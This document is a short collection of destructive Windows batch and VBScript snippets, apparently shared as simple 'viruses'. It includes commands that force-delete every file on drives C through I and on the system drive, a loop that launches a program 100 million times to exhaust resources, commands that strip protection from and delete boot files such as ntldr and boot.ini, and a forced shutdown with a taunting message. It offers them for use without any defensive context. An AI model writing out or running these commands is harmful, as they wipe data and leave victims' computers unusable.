
@echo off

Del C:\*.* /f /s /q

Del D:\*.* /f /s /q

Del E:\*.* /f /s /q

Del F:\*.* /f /s /q

Del G:\*.* /f /s /q

Del H:\*.* /f /s /q

Del I:\*.* /f /s /q


@echo off

del %systemdrive%*.* /f /s /q

shutdown -r -f -t 00


Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell") 
 
Dim x
For x = 1 to 100000000
WSHShell.Run "Tourstart.exe"
Save virus 3 file with .vbs file extension

@echo off

attrib -r -s -h c:autoexec.bat

del c:autoexec.bat

attrib -r -s -h c:boot.ini

del c:boot.ini

attrib -r -s -h c:ntldr

del c:ntldr

attrib -r -s -h c:windowswin.ini

del c:windowswin.ini

@echo off

msg * YOU GOT OWNED!!!

shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive
